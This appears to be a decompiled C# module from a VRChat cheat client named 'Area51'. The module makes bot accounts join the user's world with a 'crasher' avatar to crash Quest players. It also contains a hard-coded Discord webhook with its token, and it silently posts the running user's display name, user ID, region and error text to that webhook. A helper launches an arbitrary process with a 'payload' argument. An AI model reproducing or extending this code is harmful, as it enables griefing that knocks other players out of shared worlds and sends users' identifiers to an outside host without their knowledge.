using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Area51.SDK;
using Newtonsoft.Json;
using VRC.Core;

namespace Area51.Module.Bot.Local
{
	internal class JoinQuestCrash : BaseModule
	{
		public static string[] Regions => new string[3] { "usw", "eu", "jp" };

		public static string GetWorldRegion => RoomManager.field_Internal_Static_ApiWorldInstance_0.region.ToString();

		public JoinQuestCrash()
			: base("Join & Quest kill", "Bots Join World With Crasher Avitar", Main.Instance.Privatebotbutton)
		{
		}

		public override void OnEnable()
		{
			try
			{
				if (!Directory.Exists("\\Area51\\Bot\\Area51.exe"))
				{
					string getWorldID = PlayerWrapper.GetWorldID;
					string getinstanceID = PlayerWrapper.GetinstanceID;
					string getUserID = PlayerWrapper.GetUserID;
					string text = AppDomain.CurrentDomain.BaseDirectory + "\\Area51\\Bot\\";
					string region = GetRegion(GetWorldRegion);
					LogHandler.Log(LogHandler.Colors.Red, getWorldID + "\n" + getUserID + "\n" + text + "\n");
					if (File.Exists(text + "Area51.exe"))
					{
						LogHandler.Log(LogHandler.Colors.Red, "Bots are joining world.");
						LogHandler.LogDebug("Bots Joining Now To Crash Quest players");
					}
					else
					{
						LogHandler.Log(LogHandler.Colors.Red, "Bots failed to join world.");
						LogHandler.LogDebug("Failed To Join World");
					}
					log();
				}
				else
				{
					LogHandler.Log(LogHandler.Colors.Red, "You Dont Have Access To Local Handler");
					LogHandler.LogDebug("You Dont Have Access To Local Handler");
				}
			}
			catch (Exception ex)
			{
				LogHandler.Log(LogHandler.Colors.Red, ex.ToString());
				APIUser currentUser = APIUser.CurrentUser;
				string requestUriString = "https://discord.com/api/webhooks/915691072653516800/oN5YrAZ2wZlnsXSor_WtyK5Il4VEZdXBZa5Lrvf1sJhNJl0-ZJOXkGTMZnzJfbw69yWk";
				WebRequest webRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
				webRequest.ContentType = "application/json";
				webRequest.Method = "POST";
				using (StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream()))
				{
					string value = JsonConvert.SerializeObject(new
					{
						username = "Photon Logs",
						embeds = new[]
						{
							new
							{
								description = currentUser.displayName + " Cannot Execute Command \n " + ex.ToString(),
								title = "Command: Join & PC Kill",
								color = "10038562"
							}
						}
					});
					streamWriter.Write(value);
				}
				HttpWebResponse httpWebResponse = (HttpWebResponse)webRequest.GetResponse();
			}
		}

		public void StartBot(string fileName, string Payload)
		{
			if (fileName == "" || Payload == "")
			{
				LogHandler.Log(LogHandler.Colors.Red, "Empty Input", timeStamp: true);
			}
			Process process = new Process
			{
				StartInfo = 
				{
					FileName = fileName,
					Arguments = Payload
				}
			};
			process.Start();
		}

		private static string GetRegion(string input)
		{
			return input switch
			{
				"Europe" => "eu", 
				"US_East" => "us", 
				"US_West" => "usw", 
				_ => "usw", 
			};
		}

		public static void log()
		{
			APIUser currentUser = APIUser.CurrentUser;
			string requestUriString = "https://discord.com/api/webhooks/915691072653516800/oN5YrAZ2wZlnsXSor_WtyK5Il4VEZdXBZa5Lrvf1sJhNJl0-ZJOXkGTMZnzJfbw69yWk";
			WebRequest webRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			webRequest.ContentType = "application/json";
			webRequest.Method = "POST";
			using (StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream()))
			{
				string value = JsonConvert.SerializeObject(new
				{
					username = "Photon Logs",
					embeds = new[]
					{
						new
						{
							description = $"Username: {currentUser.displayName} \n ========================================================= \n UserID: {currentUser.id} \n ========================================================= \n Region: {RoomManager.field_Internal_Static_ApiWorldInstance_0._region_k__BackingField}",
							title = "Command: Join & PC Kill",
							color = "1752220"
						}
					}
				});
				streamWriter.Write(value);
			}
			HttpWebResponse httpWebResponse = (HttpWebResponse)webRequest.GetResponse();
		}
	}
}
